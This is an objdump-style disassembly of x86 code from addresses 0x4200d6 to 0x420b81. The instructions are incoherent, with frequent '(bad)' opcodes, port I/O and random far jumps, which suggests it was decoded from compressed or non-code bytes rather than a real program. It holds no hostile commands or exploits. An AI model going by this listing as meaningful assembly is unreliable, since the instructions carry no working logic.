  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffb9
  4200e3:	and    DWORD PTR [edx+0x157e65c],ebx
  4200e9:	add    bh,bh
  4200eb:	add    BYTE PTR [eax],al
  4200ed:	add    BYTE PTR [edx+0x1e],cl
  4200f0:	adc    BYTE PTR [edi],ch
  4200f2:	sub    DWORD PTR [ebx-0x73252f80],0x6ad2f9a7
  4200fc:	popf   
  4200fd:	es popa 
  4200ff:	and    ch,BYTE PTR [eax+0x68527639]
  420105:	cmp    dh,dh
  420107:	push   0xffffff9c
  420109:	clc    
  42010a:	xor    al,0xf0
  42010c:	mov    BYTE PTR [eax+0x2b3844ce],0x8f
  420113:	pop    esi
  420114:	fiadd  DWORD PTR [ecx]
  420116:	lods   al,BYTE PTR ds:[esi]
  420117:	sub    DWORD PTR [edi],eax
  420119:	sub    ecx,DWORD PTR [edx+0x68]
  42011c:	sub    al,0xb1
  42011e:	xor    bh,cl
  420120:	or     eax,0x4aa8e269
  420125:	xchg   DWORD PTR [ebp-0x38850c3a],eax
  42012b:	pop    ss
  42012c:	mov    esi,0x282b8d73
  420131:	mov    al,ds:0x5cbd1218
  420136:	leave  
  420137:	(bad)  
  420139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42013a:	les    ecx,FWORD PTR [ebp-0x33]
  42013d:	in     eax,dx
  42013e:	push   esi
  42013f:	or     esp,DWORD PTR ds:0x4ce51400
  420145:	ins    DWORD PTR es:[edi],dx
  420146:	psubusb mm6,QWORD PTR [ecx]
  420149:	xchg   ebp,eax
  42014a:	cdq    
  42014b:	mov    ebx,0xc2484f15
  420150:	sbb    DWORD PTR [eax+0x6d],esi
  420153:	add    dh,cl
  420155:	pop    ds
  420156:	jns    0x420188
  420158:	icebp  
  420159:	jno    0x420173
  42015b:	sub    ch,BYTE PTR [edx]
  42015d:	jo     0x420162
  42015f:	mov    ebp,0xf4ab91ae
  420165:	xor    DWORD PTR [ebp+0x28568b59],ebx
  42016b:	pop    edi
  42016c:	ins    BYTE PTR es:[edi],dx
  42016d:	sbb    ecx,DWORD PTR [esi-0xa]
  420170:	psubusb mm4,QWORD PTR [ebx+eax*1+0x6d198cc2]
  420178:	lods   eax,DWORD PTR ds:[esi]
  420179:	outs   dx,BYTE PTR ds:[esi]
  42017a:	jg     0x420131
  42017c:	jp     0x420123
  42017e:	pop    es
  42017f:	or     eax,DWORD PTR [esi-0x5b]
  420182:	or     ebp,esp
  420184:	and    bh,BYTE PTR [edi+0x54]
  420187:	sar    DWORD PTR [esi+edi*1+0xf],cl
  42018b:	cmc    
  42018c:	cmp    ebx,ecx
  42018e:	mov    al,0xbe
  420190:	jne    0x420189
  420192:	sbb    eax,0x5ece005f
  420197:	mov    ds:0xdfeb1431,al
  42019c:	sub    eax,0x81f1236d
  4201a1:	cmp    ch,BYTE PTR [eax]
  4201a3:	cmp    BYTE PTR [ebx+0x29],bh
  4201a6:	or     eax,0xa2df759
  4201ab:	mov    al,0xda
  4201ad:	sub    bh,bl
  4201af:	pop    esp
  4201b0:	push   cs
  4201b1:	push   eax
  4201b2:	fstp   QWORD PTR [ebx]
  4201b4:	in     al,dx
  4201b5:	or     al,0xbb
  4201b7:	sbb    cl,ah
  4201b9:	(bad)  
  4201ba:	cli    
  4201bb:	xor    al,0xd6
  4201bd:	scas   al,BYTE PTR es:[edi]
  4201be:	aam    0x43
  4201c0:	cwde   
  4201c1:	or     DWORD PTR [esi],edi
  4201c3:	stc    
  4201c4:	sbb    BYTE PTR ds:0xc1a522b5,0xb
  4201cb:	xchg   ebp,eax
  4201cc:	jns    0x420180
  4201ce:	das    
  4201cf:	popf   
  4201d0:	cld    
  4201d1:	sbb    eax,0x8157d96d
  4201d6:	imul   ebp,esi,0x1a619891
  4201dc:	fcomip st,st(6)
  4201de:	les    edx,FWORD PTR [esp+eax*4]
  4201e1:	lahf   
  4201e2:	pop    ds
  4201e3:	sub    al,BYTE PTR [ebx]
  4201e5:	jbe    0x420225
  4201e7:	mov    edi,DWORD PTR [ecx+0x32]
  4201ea:	fnstsw WORD PTR [ebp+0x57]
	...
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x4d18d7bb],1
  420266:	in     eax,0x58
  420268:	add    DWORD PTR [eax],eax
  42026a:	inc    DWORD PTR [eax]
  42026c:	add    BYTE PTR [eax],al
  42026e:	pop    eax
  42026f:	push   0xffffff9e
  420271:	jg     0x4202f0
  420273:	dec    ebx
  420274:	add    BYTE PTR [ebx+0x46d5f6c8],ah
  42027a:	fld    QWORD PTR [esi-0x4c]
  42027d:	(bad)  
  42027e:	mov    edx,0x1f12f08
  420283:	or     eax,0xdcc3fe73
  420288:	lea    eax,[edx]
  42028a:	jmp    0xce2af73c
  42028f:	mov    ebx,0xb0f907c0
  420294:	das    
  420295:	lds    edi,FWORD PTR [ecx-0x6f]
  420298:	add    eax,DWORD PTR [esi+0x52346d4a]
  42029e:	ins    DWORD PTR es:[edi],dx
  42029f:	push   cs
  4202a0:	dec    ecx
  4202a1:	popf   
  4202a2:	scas   al,BYTE PTR es:[edi]
  4202a3:	test   al,0x6b
  4202a5:	fmul   st,st(6)
  4202a7:	pop    ds
  4202a8:	int    0x47
  4202aa:	imul   edi,DWORD PTR [ecx],0xb963d972
  4202b0:	loopne 0x420291
  4202b2:	ffree  st(7)
  4202b4:	out    0x98,al
  4202b6:	mov    eax,ds:0x84907d47
  4202bb:	ins    DWORD PTR es:[edi],dx
  4202bc:	push   ebx
  4202bd:	xchg   ebp,ebp
  4202bf:	nop
  4202c0:	push   ecx
  4202c1:	jo     0x42028a
  4202c3:	pop    ecx
  4202c4:	xchg   esi,eax
  4202c5:	ficom  WORD PTR [ecx]
  4202c7:	xchg   ebx,eax
  4202c8:	adc    eax,0xc1e3ae74
  4202cd:	cmp    esi,DWORD PTR [ebx+ebp*4+0x1d1df82b]
  4202d4:	inc    eax
  4202d5:	xchg   esp,eax
  4202d6:	ficomp DWORD PTR [edx+0x618ba79b]
  4202dc:	cwde   
  4202dd:	fist   DWORD PTR [ebx+0x1408b6cd]
  4202e3:	mov    bh,0x53
  4202e5:	lods   al,BYTE PTR ds:[esi]
  4202e6:	ins    BYTE PTR es:[edi],dx
  4202e7:	imul   esi,DWORD PTR [edx],0x8da6348e
  4202ed:	fnstenv [ebp-0x7ae45a77]
  4202f3:	outs   dx,BYTE PTR ds:[esi]
  4202f4:	jg     0x4202fc
  4202f6:	and    ebp,edi
  4202f8:	ins    DWORD PTR es:[edi],dx
  4202f9:	push   ecx
  4202fa:	inc    ebx
  4202fb:	mov    esp,eax
  4202fd:	xchg   ebp,eax
  4202fe:	mov    dl,0x16
  420300:	sub    al,0x5a
  420302:	or     bl,BYTE PTR [esi-0x520bdf56]
  420308:	push   ebx
  420309:	dec    esi
  42030a:	xor    DWORD PTR ds:0x2382e2a5,0x9e9805b5
  420314:	sahf   
  420315:	(bad)  
  420316:	ins    DWORD PTR es:[edi],dx
  420317:	fdiv   DWORD PTR [ebp+0x2f]
  42031a:	mov    bl,0xef
  42031c:	jnp    0x420380
  42031e:	jge    0x42033b
  420320:	or     ecx,edi
  420322:	sub    bh,BYTE PTR [ecx]
  420324:	div    BYTE PTR cs:[eax]
  420327:	pop    ebp
  420328:	adc    DWORD PTR [ebx],esi
  42032a:	add    al,0xe6
  42032c:	push   es
  42032d:	inc    edx
  42032e:	jp     0x4202cd
  420330:	cmp    al,0xf6
  420332:	aas    
  420333:	scas   al,BYTE PTR es:[edi]
  420334:	inc    edx
  420335:	in     al,0xe5
  420337:	ins    BYTE PTR es:[edi],dx
  420338:	dec    esp
  420339:	jmp    0x504fad6
  42033e:	mov    DWORD PTR [ebp+0x236a5d8b],edx
  420344:	ins    DWORD PTR es:[edi],dx
  420345:	adc    edx,edx
  420347:	mov    ebp,0x9275a2e8
  42034c:	and    ebp,edi
  42034e:	mov    BYTE PTR [edx+0x3b],dh
  420351:	aas    
  420352:	in     al,0x27
  420354:	adc    eax,0x5e809d55
  420359:	push   edx
  42035a:	(bad)  
  42035b:	std    
  42035c:	out    0xf7,al
  42035e:	and    ch,al
  420360:	(bad)
  420363:	dec    ebp
  420364:	mov    bh,0x63
  420366:	push   edi
  420367:	pop    ebx
  420368:	xchg   edx,eax
  420369:	or     al,0xff
  42036b:	jl     0x4203ad
	...
  4203d5:	add    BYTE PTR [ecx+0x6],al
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	inc    eax
  4203e3:	xor    eax,0x59e4833d
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	inc    DWORD PTR [eax]
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	out    dx,eax
  4203ef:	sub    ebx,esi
  4203f1:	jmp    0xff72:0x7049bed
  4203f8:	out    dx,al
  4203f9:	inc    ebx
  4203fa:	push   esi
  4203fb:	mov    bh,0x94
  4203fd:	sbb    eax,0xf5273859
  420402:	lods   eax,DWORD PTR ds:[esi]
  420403:	test   dh,al
  420405:	xchg   esp,eax
  420406:	jp     0x420472
  420408:	adc    al,0xae
  42040a:	jmp    FWORD PTR [esi-0x54]
  42040d:	or     DWORD PTR ds:0x6efbc0b3,edi
  420413:	dec    esi
  420414:	mov    al,0x4e
  420416:	pop    esp
  420417:	hlt    
  420418:	out    dx,al
  420419:	push   0xffffffff
  42041b:	sub    dh,0x50
  42041e:	jno    0x42042d
  420420:	pop    ss
  420421:	push   ecx
  420422:	dec    ebx
  420423:	mov    ah,0x18
  420425:	(bad)  
  420426:	sub    BYTE PTR [ecx],cl
  420428:	fst    DWORD PTR [ebx+0x59c31274]
  42042e:	inc    ebx
  42042f:	push   ebx
  420430:	cwde   
  420431:	nop
  420432:	lods   eax,DWORD PTR ds:[esi]
  420433:	ja     0x420489
  420435:	adc    eax,0x62138f1a
  42043a:	pop    es
  42043b:	lds    esi,FWORD PTR ds:0x500a59ca
  420441:	pop    es
  420442:	sub    bl,BYTE PTR [edi]
  420444:	and    eax,0x1c3777a4
  420449:	mov    ch,0x43
  42044b:	popf   
  42044c:	out    0x77,eax
  42044e:	aaa    
  42044f:	cli    
  420450:	fst    QWORD PTR [ebp+0x56]
  420453:	lods   eax,DWORD PTR ds:[esi]
  420454:	add    al,0x4d
  420456:	pop    ds
  420457:	call   0x5d04:0x78d4af45
  42045e:	fucom  st(7)
  420460:	gs aam 0x61
  420463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420464:	lods   eax,DWORD PTR ds:[esi]
  420465:	in     eax,dx
  420466:	imul   edi,DWORD PTR ds:0x26ddd13,0x5b37dc18
  420470:	sub    DWORD PTR [esi-0xe],0x50
  420474:	mov    dl,0xb6
  420476:	jno    0x42043d
  420478:	xchg   ebp,ebx
  42047a:	adc    BYTE PTR [ebx+0x2b],ch
  42047d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047f:	mov    ah,0x57
  420481:	and    cl,BYTE PTR [edi-0x1ba40a3c]
  420487:	lods   eax,DWORD PTR ds:[esi]
  420488:	xor    ebx,eax
  42048a:	and    DWORD PTR [ebp+0x5f],edi
  42048d:	jb     0x42046d
  42048f:	add    ah,BYTE PTR [edi+0x5f391d59]
  420495:	out    dx,eax
  420496:	in     eax,dx
  420497:	jl     0x42044a
  420499:	add    al,0x55
  42049b:	mov    cl,BYTE PTR [edi-0x5b34bc21]
  4204a1:	adc    esp,edx
  4204a3:	mov    edi,0x58365ba
  4204a8:	mov    ebp,0x2d2fd21
  4204ad:	pop    ebp
  4204ae:	ss lock fwait
  4204b1:	iret   
  4204b2:	adc    eax,0x73c69315
  4204b7:	cdq    
  4204b8:	sbb    eax,0x72cb9f0f
  4204bd:	mov    dl,0xd8
  4204bf:	push   eax
  4204c0:	push   eax
  4204c1:	fsubp  st(1),st
  4204c3:	int    0xab
  4204c5:	inc    ecx
  4204c6:	mov    BYTE PTR [eax+0x72],ah
  4204c9:	inc    eax
  4204ca:	mov    ah,0xcc
  4204cc:	sahf   
  4204cd:	inc    ebp
  4204ce:	test   ch,ch
  4204d0:	dec    esi
  4204d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d2:	xchg   ecx,eax
  4204d3:	mov    esp,0x3616cdda
  4204d8:	cli    
  4204d9:	xor    edi,DWORD PTR [esi+0x71cff54e]
  4204df:	inc    eax
  4204e1:	mov    edi,0x5839c2d9
  4204e6:	xor    BYTE PTR [ecx+0x4f707b56],al
  4204ec:	fadd   DWORD PTR [eax]
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	fsub   QWORD PTR [eax]
  420564:	js     0x4204f8
  420566:	jecxz  0x4205c2
  420568:	add    DWORD PTR [eax],eax
  42056a:	inc    DWORD PTR [eax]
  42056c:	add    BYTE PTR [eax],al
  42056e:	retf   0x5d29
  420571:	repz test al,0xc7
  420574:	loopne 0x4205c5
  420576:	or     ecx,DWORD PTR [ecx-0x4ac2fd5a]
  42057c:	inc    esp
  42057d:	rcr    BYTE PTR [edx+0x6af9b6fd],0x6a
  420584:	adc    al,0xa3
  420586:	sub    eax,0xbe1e000c
  42058b:	dec    esp
  42058c:	ins    BYTE PTR es:[edi],dx
  42058d:	dec    ebx
  42058e:	rol    DWORD PTR [edx-0x38],cl
  420591:	lea    esp,[esi+eax*1-0x41ff35e0]
  420598:	jbe    0x420575
  42059a:	or     BYTE PTR [esi+0x1a],bl
  42059d:	test   BYTE PTR [ecx],al
  42059f:	sbb    ch,al
  4205a1:	sub    edi,DWORD PTR [edi-0x405f1287]
  4205a7:	lods   al,BYTE PTR ds:[esi]
  4205a8:	dec    eax
  4205a9:	pop    es
  4205aa:	fistp  DWORD PTR [ecx]
  4205ac:	jnp    0x420558
  4205ae:	retf   
  4205af:	push   ebx
  4205b0:	cld    
  4205b1:	pop    edx
  4205b2:	jo     0x4205d1
  4205b4:	gs dec edx
  4205b6:	(bad)  
  4205b7:	fist   DWORD PTR [esi+esi*8-0x1a]
  4205bb:	call   0x525e:0xc1255cb1
  4205c2:	xchg   ebx,eax
  4205c3:	dec    eax
  4205c4:	or     eax,ecx
  4205c6:	and    ecx,DWORD PTR [ebp-0x60]
  4205c9:	aas    
  4205ca:	call   0x9646b27d
  4205cf:	mov    ecx,0x81acc144
  4205d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205d5:	loop   0x420577
  4205d7:	clc    
  4205d8:	xor    al,0x12
  4205da:	fnstsw WORD PTR [esi+0x42eba3ab]
  4205e0:	mov    dh,0xf5
  4205e2:	aaa    
  4205e3:	and    bh,al
  4205e5:	push   esp
  4205e6:	fbld   TBYTE PTR [ecx-0x57]
  4205e9:	jmp    0x4205cb
  4205eb:	ja     0x4205b4
  4205ed:	add    DWORD PTR [edx+0x5c],eax
  4205f0:	ja     0x420581
  4205f2:	stos   BYTE PTR es:[edi],al
  4205f3:	call   0x8a80:0x93c47df9
  4205fa:	pusha  
  4205fb:	hlt    
  4205fc:	push   0x61
  4205fe:	rcr    DWORD PTR [ebx+ecx*4],0x6
  420602:	arpl   WORD PTR [edx-0x22dc819b],cx
  420608:	test   DWORD PTR cs:[esi],0xb15b2b0d
  42060f:	mov    edx,0x6780b580
  420614:	lds    ebp,FWORD PTR [eax]
  420616:	jb     0x420623
  420618:	icebp  
  420619:	mov    edi,0xee546468
  42061e:	call   0xef89c38c
  420623:	call   0x3d3af462
  420628:	add    ecx,DWORD PTR [ebx-0x7f153b08]
  42062e:	cdq    
  42062f:	mov    ecx,0x9197c141
  420634:	inc    esp
  420635:	mov    bl,0x1f
  420637:	int    0x17
  420639:	mov    ebp,0x4e4f2ec4
  42063e:	mov    esp,0xd07ff7fe
  420643:	pop    ss
  420644:	nop/reserved BYTE PTR [esi-0x5d3f827f]
  42064b:	and    eax,0x49010c3e
  420650:	dec    esp
  420651:	push   0xa
  420653:	push   ss
  420654:	icebp  
  420655:	cli    
  420656:	xor    al,0x4b
  420658:	test   eax,0x5ff31bd4
  42065d:	out    dx,al
  42065e:	jecxz  0x420609
  420660:	mov    dl,dl
  420662:	mov    DWORD PTR [ecx-0x524f3fff],esp
  420668:	test   eax,0x94aa5fa0
	...
  4206d5:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4206dc:	mov    ah,0xec
  4206de:	lds    eax,FWORD PTR [eax]
  4206e0:	aad    0x78
  4206e2:	add    al,0xc0
  4206e5:	mul    dl
  4206e7:	pop    ebx
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	inc    DWORD PTR [eax]
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	ret    0xcff9
  4206f1:	and    esi,DWORD PTR [edi+0x5fcee8bc]
  4206f7:	ret    0x7085
  4206fa:	popf   
  4206fb:	pushf  
  4206fc:	mov    eax,ds:0x308229d9
  420701:	or     al,0x48
  420703:	mov    ch,0x95
  420705:	out    0xdc,eax
  420707:	cli    
  420708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420709:	adc    al,0x98
  42070b:	mov    esp,0x6d11999e
  420710:	adc    al,0x3e
  420712:	fxch   st(7)
  420714:	nop
  420715:	ds add al,0x1e
  420718:	xor    eax,eax
  42071a:	mov    cl,0x3
  42071c:	aad    0x7b
  42071e:	ficom  DWORD PTR [ecx]
  420720:	add    al,0x94
  420722:	pop    esp
  420723:	dec    edi
  420724:	mov    ch,0x8
  420726:	xor    BYTE PTR [esi+0x6b2d1d33],cl
  42072c:	jge    0x420774
  42072e:	mul    DWORD PTR [ecx]
  420730:	mov    esp,0xdfb6ee05
  420735:	adc    dh,BYTE PTR [edi+0x28]
  420738:	push   ecx
  420739:	xor    eax,0xe7621d0c
  42073e:	rcl    BYTE PTR [eax+ebp*8],1
  420741:	cli    
  420742:	push   edi
  420743:	pop    ebx
  420744:	xchg   ebp,eax
  420745:	mov    ecx,0xca5bf063
  42074a:	jle    0x4206e6
  42074c:	ds pop ebx
  42074e:	and    edx,DWORD PTR [eax+0x4a]
  420751:	gs ds jg 0x4206d6
  420755:	icebp  
  420756:	xor    eax,DWORD PTR [ebx+0x48]
  420759:	mov    ds:0xa8efb2b8,al
  42075e:	mov    al,0x2d
  420760:	out    0x7a,al
  420762:	cmp    eax,DWORD PTR [ebx+0x76]
  420765:	xchg   edx,eax
  420766:	das    
  420767:	lea    edx,[edx+0x77]
  42076a:	shl    ebp,0xbd
  42076d:	lock into 
  42076f:	jnp    0x4206fc
  420771:	stos   BYTE PTR es:[edi],al
  420772:	mov    BYTE PTR [esi+edx*1],dh
  420775:	imul   ecx,DWORD PTR [eax+0x3f263ba],0x8efeb949
  42077f:	dec    esp
  420780:	cli    
  420781:	dec    esp
  420782:	clc    
  420783:	add    al,0x42
  420785:	rcr    BYTE PTR [esi+ebp*4+0x42],0x89
  42078a:	adc    edi,esi
  42078c:	mov    al,ds:0x7f5cc190
  420791:	test   dh,ch
  420793:	mov    ds:0x90a1b1e,eax
  420798:	push   esi
  420799:	pop    ds
  42079a:	xchg   ecx,eax
  42079b:	xchg   ebx,eax
  42079c:	into   
  42079d:	cli    
  42079e:	adc    al,0x0
  4207a0:	(bad)  
  4207a1:	aas    
  4207a2:	mov    dl,0x40
  4207a4:	clc    
  4207a5:	mov    ah,0x95
  4207a7:	(bad)  
  4207a8:	aad    0xec
  4207aa:	repnz test eax,0x66aa62
  4207b0:	stc    
  4207b1:	pop    ecx
  4207b2:	ss fs (bad) 
  4207b5:	or     cl,ch
  4207b7:	(bad)  [ebx]
  4207b9:	push   es
  4207ba:	lods   eax,DWORD PTR ds:[esi]
  4207bb:	in     al,0x4
  4207bd:	js     0x420745
  4207bf:	push   ss
  4207c0:	lea    ecx,[edx-0x45365543]
  4207c6:	sbb    BYTE PTR [eax],ch
  4207c8:	jecxz  0x420824
  4207ca:	fidivr DWORD PTR [esp+ebx*4-0x57]
  4207ce:	mov    ebx,es
  4207d0:	jb     0x4207c6
  4207d2:	test   BYTE PTR [esi],dl
  4207d4:	in     al,dx
  4207d5:	std    
  4207d6:	aaa    
  4207d7:	pop    es
  4207d8:	in     al,dx
  4207d9:	mov    eax,0x72324739
  4207de:	and    esi,DWORD PTR [eax-0x55f45948]
  4207e4:	mov    esi,0x9768a32e
  4207e9:	retf   0xd81d
  4207ec:	jbe    0x4207ee
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	add    BYTE PTR [ecx+0x5ce19d22],0x1
  420869:	add    bh,bh
  42086b:	add    BYTE PTR [eax],al
  42086d:	add    BYTE PTR [edi+edi*4+0x23e409da],ch
  420874:	sub    esp,DWORD PTR [esi]
  420876:	adc    ch,bh
  420878:	ins    DWORD PTR es:[edi],dx
  420879:	dec    esp
  42087a:	or     dl,0x7a
  42087d:	cdq    
  42087e:	test   DWORD PTR [ebp-0x70],0x4520cea8
  420885:	pop    edi
  420886:	imul   ebx,edx,0xfffffff5
  420889:	scas   eax,DWORD PTR es:[edi]
  42088a:	push   cs
  42088b:	add    DWORD PTR [esi-0x2e],edx
  42088e:	mov    eax,0x4a542ab5
  420893:	fdiv   QWORD PTR [ebp-0x186b7731]
  420899:	shl    BYTE PTR [edx+0xed15ce7],1
  42089f:	scas   eax,DWORD PTR es:[edi]
  4208a0:	pcmpgtd mm3,QWORD PTR [ebx+0x6b]
  4208a4:	rcl    BYTE PTR [esi+0x4cc31d0a],cl
  4208aa:	adc    dl,BYTE PTR [ebx-0x2199b654]
  4208b0:	sahf   
  4208b1:	mov    dl,0x47
  4208b3:	mov    al,ds:0x8a7c061a
  4208b8:	data16 inc BYTE PTR [edx+esi*4]
  4208bc:	jmp    0x4208e5
  4208be:	(bad)  
  4208bf:	rol    DWORD PTR [ebx],cl
  4208c1:	pop    ss
  4208c2:	sti    
  4208c3:	sub    al,0xb2
  4208c5:	mov    ch,0x36
  4208c7:	adc    eax,0x891a636e
  4208cc:	iret   
  4208cd:	push   cs
  4208ce:	mov    WORD PTR [eax-0x73],fs
  4208d1:	or     DWORD PTR [ebx+0x1a43c83a],0x7a05c34
  4208db:	repz cmp ah,al
  4208de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208df:	cs jb  0x420864
  4208e2:	cld    
  4208e3:	mov    fs,esp
  4208e5:	ret    0xfbea
  4208e8:	call   0x22461a7f
  4208ed:	(bad)  
  4208ee:	jmp    0x420889
  4208f0:	fistp  QWORD PTR [esi-0x773c5f55]
  4208f6:	sahf   
  4208f7:	xchg   ebp,eax
  4208f8:	mov    esi,0x6e83a4e4
  4208fd:	lahf   
  4208fe:	push   cs
  4208ff:	aaa    
  420900:	fst    DWORD PTR ds:0xc2b8980
  420906:	scas   al,BYTE PTR es:[edi]
  420907:	pop    ebx
  420908:	ret    
  420909:	mov    WORD PTR [eax+0x48],gs
  42090c:	fbld   TBYTE PTR [eax+0x1d9c2028]
  420912:	(bad)  
  420913:	push   edx
  420914:	pop    ecx
  420915:	xor    BYTE PTR [esi],0xe6
  420918:	jnp    0x4208cd
  42091a:	add    al,0x5d
  42091c:	pop    edx
  42091d:	ins    DWORD PTR es:[edi],dx
  42091e:	mov    ebx,DWORD PTR [ebp-0x49]
  420921:	mov    ch,0xae
  420923:	sbb    esp,edx
  420925:	lahf   
  420926:	arpl   WORD PTR [ecx+0x27],bx
  420929:	jmp    0xdbe1:0x3480f2bb
  420930:	popa   
  420931:	lds    ebp,FWORD PTR [edi+0x0]
  420934:	in     al,dx
  420935:	xor    DWORD PTR [ecx-0x547b90aa],ebp
  42093b:	or     dh,dh
  42093d:	xor    BYTE PTR [eax],dh
  42093f:	mov    ds,WORD PTR [edx]
  420941:	sbb    al,BYTE PTR [esi+0x7]
  420944:	pop    esp
  420945:	jecxz  0x420982
  420947:	and    cl,BYTE PTR [esi-0x41166f72]
  42094d:	jg     0x420974
  42094f:	cwde   
  420950:	fucomp st(6)
  420952:	dec    esi
  420953:	mov    WORD PTR ss:[ecx+0x4e],es
  420957:	shl    DWORD PTR [ecx-0x2537b721],cl
  42095d:	mov    edi,0xfe8df212
  420962:	imul   eax,DWORD PTR [eax+eiz*8],0x2f349971
  420969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42096a:	cmc    
  42096b:	test   ch,0x0
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0xab
  4209e3:	idiv   DWORD PTR [ebx]
  4209e5:	hlt    
  4209e6:	loopne 0x420a45
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	inc    DWORD PTR [eax]
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	sar    ebx,1
  4209f0:	inc    eax
  4209f1:	es fs jnp 0x4209de
  4209f5:	mov    al,ds:0x5aea4e55
  4209fa:	sahf   
  4209fb:	sub    BYTE PTR [eax+0x152ff52],ah
  420a01:	jmp    0x6c7c:0x6e0fadf7
  420a08:	(bad)  
  420a09:	jno    0x420990
  420a0b:	pushf  
  420a0c:	int    0xca
  420a0e:	enter  0x5571,0x28
  420a12:	jp     0x420a6f
  420a14:	in     eax,dx
  420a15:	daa    
  420a16:	inc    edi
  420a17:	jge    0x420a6d
  420a19:	push   ecx
  420a1a:	and    DWORD PTR [esi-0x7],0x32ba7a42
  420a21:	(bad)  
  420a22:	addr16 aad 0xd7
  420a25:	pop    ss
  420a26:	mov    ah,0x57
  420a28:	xlat   BYTE PTR ds:[ebx]
  420a29:	shr    DWORD PTR [edi+0x36],0xbd
  420a2d:	sbb    BYTE PTR [ebp+0x5f],bl
  420a30:	xor    edi,ebx
  420a32:	nop
  420a33:	sub    eax,0x68a7f7fb
  420a38:	xchg   ebx,eax
  420a39:	mov    eax,0xe32e2731
  420a3e:	or     BYTE PTR [edi],bl
  420a40:	jns    0x420a0c
  420a42:	not    DWORD PTR [edx+0x772f86bb]
  420a48:	or     eax,0xb858db14
  420a4d:	jne    0x420a99
  420a4f:	or     bh,BYTE PTR [edx-0x1e]
  420a52:	jo     0x420a6d
  420a54:	cmp    BYTE PTR [edx+0x76],ah
  420a57:	leave  
  420a58:	cs mov bl,0xe2
  420a5b:	mov    esi,0x2de62473
  420a60:	imul   edi,DWORD PTR [ebp+0x42],0x713df6be
  420a67:	(bad)
  420a6a:	xchg   edx,eax
  420a6b:	jmp    0x45a2:0x61009515
  420a72:	cmp    al,0xe8
  420a74:	clc    
  420a75:	jbe    0x420ac5
  420a77:	add    al,0xa2
  420a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a7a:	jne    0x420ada
  420a7c:	jb     0x420a5d
  420a7e:	pop    ecx
  420a7f:	sbb    al,0x55
  420a81:	or     bl,BYTE PTR [bx+si-0x1082]
  420a86:	sbb    cl,0xad
  420a89:	mov    ds:0x516c7526,eax
  420a8e:	mov    eax,ds:0x28043e45
  420a93:	cld    
  420a94:	stos   DWORD PTR es:[edi],eax
  420a95:	xchg   ecx,eax
  420a96:	pcmpgtd mm1,QWORD PTR [edi-0x1d]
  420a9a:	and    DWORD PTR [esi],ecx
  420a9c:	rcl    BYTE PTR [esi+ebp*4+0x20],cl
  420aa0:	(bad)  
  420aa1:	icebp  
  420aa2:	adc    BYTE PTR ds:0xb5ad8591,cl
  420aa8:	mov    dh,BYTE PTR [edi]
  420aaa:	jg     0x420b21
  420aac:	fisttp WORD PTR [edx-0x34fce7fb]
  420ab2:	push   0xff00307e
  420ab7:	(bad)  
  420ab8:	dec    ebp
  420ab9:	dec    eax
  420aba:	je     0x420a8b
  420abc:	cdq    
  420abd:	xchg   ebx,eax
  420abe:	push   0x8b3eff2e
  420ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ac4:	xchg   ebp,eax
  420ac5:	jmp    0xe3d3d28c
  420aca:	test   DWORD PTR ds:[ecx+0x10],esp
  420ace:	retf   0x15b1
  420ad1:	fcmovnu st,st(7)
  420ad3:	pop    esp
  420ad4:	rcl    BYTE PTR [edi+0x70],cl
  420ad7:	pop    eax
  420ad8:	and    bh,BYTE PTR [eax-0x6a3d5fce]
  420ade:	jp     0x420a76
  420ae0:	or     edx,DWORD PTR [ebx]
  420ae2:	sub    BYTE PTR [edi-0x4c],dl
  420ae5:	pusha  
  420ae6:	mov    ebx,0x3f3d550e
  420aeb:	adc    ebp,DWORD PTR [esi+0x0]
	...
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	std    
  420b63:	push   esi
  420b64:	ficomp WORD PTR [ecx]
  420b66:	fistp  WORD PTR [esi+0x1]
  420b69:	add    bh,bh
  420b6b:	add    BYTE PTR [eax],al
  420b6d:	add    al,ah
  420b6f:	lds    eax,FWORD PTR [ebp-0x35e65297]
  420b75:	pop    es
  420b76:	fidiv  WORD PTR [esi]
  420b78:	ins    BYTE PTR es:[edi],dx
  420b79:	popf   
  420b7a:	adc    dl,BYTE PTR [ecx-0x92052f0]
  420b80:	lods   eax,DWORD PTR ds:[esi]
  420b81:	dec    edx
